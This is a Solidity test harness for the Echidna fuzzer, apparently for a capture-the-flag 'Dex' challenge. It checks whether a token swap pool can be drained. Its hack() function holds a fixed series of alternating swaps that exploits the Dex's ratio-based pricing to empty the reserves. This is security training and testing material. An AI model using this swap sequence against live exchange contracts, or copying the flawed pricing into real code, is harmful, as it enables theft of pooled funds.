// // SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.0;

 import "./Dex.sol";

/// @dev Run the template with
///      ```
///      solc-select use 0.8.20 --always-install
///      echidna src/Dex1-CaptureTheEther/Dex.t.sol --contract DexTest
///      ```
contract DexTest is Dex {
    event Debug(uint num);

    address echidna = tx.origin;

    constructor() {
        assert(echidna == msg.sender);

        uint totalSupply = 100;
        SwappableToken _token1 = new SwappableToken(
            address(this),
            "Token1",
            "T1",
            totalSupply
        );
        SwappableToken _token2 = new SwappableToken(
            address(this),
            "Token2",
            "T2",
            totalSupply
        );
        assert(_token1.balanceOf(address(this)) == totalSupply);
        assert(_token2.balanceOf(address(this)) == totalSupply);

        setTokens(address(_token1), address(_token2));

        uint amountToGiveToEchidna = 10;
        _token1.transfer(msg.sender, amountToGiveToEchidna);
        _token2.transfer(msg.sender, amountToGiveToEchidna);
        approve(address(this), type(uint256).max);

        assert(_token1.balanceOf(address(this)) == totalSupply - amountToGiveToEchidna);
        assert(_token2.balanceOf(address(this)) == totalSupply - amountToGiveToEchidna);
        assert(_token1.balanceOf(msg.sender) == amountToGiveToEchidna);
        assert(_token2.balanceOf(msg.sender) == amountToGiveToEchidna);

        renounceOwnership();
    }

    function hack() public {
        swapAForB(10);
        swapBForA(20);
        swapAForB(25);
        swapBForA(33);
        swapAForB(49);
    }

    function swapAForB(uint amount) public {
        swap(token1, token2, amount);
    }

    function swapBForA(uint amount) public {
        swap(token2, token1, amount);
    }

    function echidna_test_getSwapPrice() public view returns (bool) {
        return getSwapPrice(token1, token2, 1) > 0;
    }

    function echidna_test_drain_contract() public view returns (bool) {
        return
            ERC20(token1).balanceOf(address(this)) > 10 &&
            ERC20(token2).balanceOf(address(this)) > 10;
    }
}